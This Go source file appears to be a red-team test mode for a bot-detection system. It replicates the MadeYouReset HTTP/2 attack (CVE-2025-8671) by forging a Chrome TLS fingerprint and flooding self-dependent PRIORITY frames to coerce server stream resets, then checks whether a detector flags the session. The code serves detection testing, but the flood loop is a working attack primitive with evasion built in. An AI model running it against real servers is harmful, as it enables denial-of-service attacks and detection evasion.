// evaders/go-tls/cmd/madeyoureset — the MadeYouReset (CVE-2025-8671) red-team mode.
// Coerces server stream resets with malformed control frames while sending NO client RST_STREAM.

package main

import (
	"context"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"

	gotls "github.com/datascry/kitsune/evaders/go-tls"
	utls "github.com/refraction-networking/utls"
	"golang.org/x/net/http2"
	"golang.org/x/net/http2/hpack"
)

// madeYouReset drives one HTTP/2 connection that REPLICATES the MadeYouReset attack (CVE-2025-8671): it
// forges a real Chrome ClientHello (uTLS), then on the raw h2 connection it floods SELF-DEPENDENT PRIORITY
// frames — a stream that depends on itself is an RFC 9113 §5.3.1 PROTOCOL_ERROR the server resets, so the
// client COERCES server-side stream resets WITHOUT ever sending its own RST_STREAM. That is the exact
// evasion of the rapid-reset rung (CVE-2023-44487), which keys on client RST_STREAM frames: here it stays
// quiet while `net.h2_madeyoureset` convicts. Self-dependency is the chosen primitive because Go's h2
// server treats it as a STREAM error (the connection survives, so the real request below still mints a
// session); the edge scanner also catches the other two coercion primitives (zero-increment WINDOW_UPDATE,
// mis-sized PRIORITY), which the unit tests exercise. The flood is sent BEFORE the real request so the
// edge's in-order frame tee has counted it by the time the request's handler emits the signal.
func madeYouReset(target string) {
	detector := os.Getenv("KITSUNE_DETECTOR")
	if detector == "" {
		detector = "http://detector:8080"
	}
	u, err := url.Parse(target)
	if err != nil || u.Host == "" {
		log.Fatalf("bad target %q: %v", target, err)
	}
	addr := u.Host
	if u.Port() == "" {
		addr = net.JoinHostPort(u.Hostname(), "443")
	}
	authority := u.Host
	path := u.RequestURI()

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()
	conn, err := gotls.DialH2Raw(ctx, addr, utls.HelloChrome_Auto)
	if err != nil {
		log.Fatalf("dial: %v", err)
	}
	defer conn.Close()
	_ = conn.SetDeadline(time.Now().Add(10 * time.Second))

	if _, err := conn.Write([]byte(http2.ClientPreface)); err != nil {
		log.Fatalf("preface: %v", err)
	}
	fr := http2.NewFramer(conn, conn)
	fr.ReadMetaHeaders = hpack.NewDecoder(4096, nil)
	if err := fr.WriteSettings(); err != nil {
		log.Fatalf("settings: %v", err)
	}

	// The coercion flood: self-dependent PRIORITY frames on idle streams. dep == own stream id is the
	// PROTOCOL_ERROR; no RST_STREAM is ever sent by us.
	const floodN = 60
	for i := 0; i < floodN; i++ {
		sid := uint32(1001 + 2*i)
		payload := []byte{byte(sid >> 24), byte(sid >> 16), byte(sid >> 8), byte(sid), 0} // dep=sid, weight 0
		if err := fr.WriteRawFrame(http2.FramePriority, 0, sid, payload); err != nil {
			log.Fatalf("priority flood frame %d: %v", i, err)
		}
	}

	// The real request — a higher stream id than the whole flood — mints ks_sid and triggers the per-request
	// prepare() that, having seen the flood, emits network.h2_madeyoureset.
	const reqStream = 2001
	var hbuf strings.Builder
	enc := hpack.NewEncoder(&hbuf)
	for _, f := range []hpack.HeaderField{
		{Name: ":method", Value: "GET"},
		{Name: ":scheme", Value: "https"},
		{Name: ":authority", Value: authority},
		{Name: ":path", Value: path},
		{Name: "user-agent", Value: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"},
		{Name: "accept", Value: "*/*"},
	} {
		if err := enc.WriteField(f); err != nil {
			log.Fatalf("hpack: %v", err)
		}
	}
	if err := fr.WriteHeaders(http2.HeadersFrameParam{
		StreamID: reqStream, BlockFragment: []byte(hbuf.String()), EndHeaders: true, EndStream: true,
	}); err != nil {
		log.Fatalf("request headers: %v", err)
	}

	sid := readSessionCookie(fr, reqStream)
	if sid == "" {
		log.Fatal("no ks_sid minted")
	}

	vr, err := http.Get(detector + "/verdict/" + sid) //nolint:noctx
	if err != nil {
		log.Fatalf("verdict: %v", err)
	}
	defer vr.Body.Close()
	var verdict map[string]any
	if err := json.NewDecoder(vr.Body).Decode(&verdict); err != nil {
		log.Fatalf("decode verdict: %v", err)
	}
	verdict["mode"] = "go-tls-madeyoureset"
	verdict["session_id"] = sid
	out, _ := json.Marshal(verdict) //nolint:errcheck
	fmt.Println("__KS__" + string(out))
}

// readSessionCookie reads h2 frames, ACKing the server SETTINGS, until it finds the response HEADERS for
// reqStream and extracts the ks_sid Set-Cookie the edge mints. Best-effort within the conn deadline.
func readSessionCookie(fr *http2.Framer, reqStream uint32) string {
	for {
		f, err := fr.ReadFrame()
		if err != nil {
			return ""
		}
		switch mf := f.(type) {
		case *http2.SettingsFrame:
			if !mf.IsAck() {
				_ = fr.WriteSettingsAck()
			}
		case *http2.MetaHeadersFrame:
			if mf.StreamID == reqStream {
				for _, hf := range mf.Fields {
					if strings.EqualFold(hf.Name, "set-cookie") {
						if v := cookieValue(hf.Value, "ks_sid"); v != "" {
							return v
						}
					}
				}
			}
		}
	}
}

// cookieValue pulls one cookie's value out of a Set-Cookie header line.
func cookieValue(setCookie, name string) string {
	first, _, _ := strings.Cut(setCookie, ";")
	k, v, ok := strings.Cut(strings.TrimSpace(first), "=")
	if ok && k == name {
		return v
	}
	return ""
}
